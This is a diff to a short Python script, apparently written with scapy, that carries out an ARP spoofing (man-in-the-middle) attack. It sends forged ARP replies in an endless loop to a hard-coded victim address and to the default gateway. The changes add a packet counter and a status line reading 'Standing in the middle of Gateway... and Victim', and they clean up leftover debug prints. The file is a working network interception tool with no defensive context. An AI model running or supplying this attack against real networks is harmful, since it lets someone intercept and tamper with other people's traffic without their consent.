@@ -3,6 +3,7 @@ import time
 
 victim = "192.168.0.218" #input("Enter victim IP address: ")
 gw = scapy.conf.route.route("0.0.0.0")[2]
+packet_counter = 0
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -17,22 +18,21 @@ def get_mac(ip):
         return None
 
 def spoof(victim_ip, spoof_ip):
+    global packet_counter
+
     target_mac = get_mac(victim_ip)
     if target_mac is None:
         print(f'[!] Could not get MAC address for {victim_ip}. Exiting...')
+        return
         
     packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
     
-    '''print(f'[+] MAC Address of {victim}: {target_mac}   ')
-    print(f'[+] ARP response sent to {victim_ip}, spoofing {spoof_ip}')'''
+    packet_counter += 1
 
+    print(f"\r [+] Standing in the middle of Gateway: {gw} and Victim: {victim}. Total packets sent: {packet_counter}", end="")
+    
 while True:
     spoof(gw, victim)
     spoof(victim, gw)
     time.sleep(2)
-
-'''mac_address = get_mac(victim)
-if mac_address:
-    print(f"MAC Address of {victim}: {mac_address}")
-print(f"Default Gateway: {gw}")'''
